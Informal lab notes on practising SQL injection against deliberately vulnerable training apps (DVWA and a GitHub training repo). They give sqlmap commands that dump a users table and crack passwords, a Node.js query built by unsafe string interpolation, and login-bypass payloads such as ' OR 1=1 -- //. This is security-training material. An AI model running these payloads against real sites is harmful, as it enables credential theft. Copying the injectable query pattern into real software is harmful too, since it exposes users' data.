# directions for sqlmap

## installation
- sudo apt install -y docker.io
- sudo systemctl enable docker --now
- sudo usermod -aG docker $USER
- newgrp docker
- docker run --rm -it -p 80:80 vulnerables/web-dvwa

it is done!!!

## exploitation
sqlmap --url "" --cookie "" --schema --batch
- make sure you include PHPSESSID and security:low for the cookies
sqlmap --url "" --cookie "" --columns -T users --batch
- list the users, shows us the password column
sqlmap --url "" --cookie "" --dump -T users --batch
- uses a dictionary attack for you!

# test injection scripts
connection.query(`SELECT * FROM logins WHERE name="${req.body.username}" AND password="${req.body.password}";`,

- admin
- " OR 1 = 1 OR ""="

# the php server 
https://github.com/nicolesteffens0/sqlinjection-training-app
- clone repo
- docker-compose up
- (optional) stumble around for an hour trying to find what port the server is on 
    - (optional) fail to find the walkthough and use "netstat -ant" to find it yourself

WORKING ATTACKS
- ' OR 1=1 -- //
goes to admin
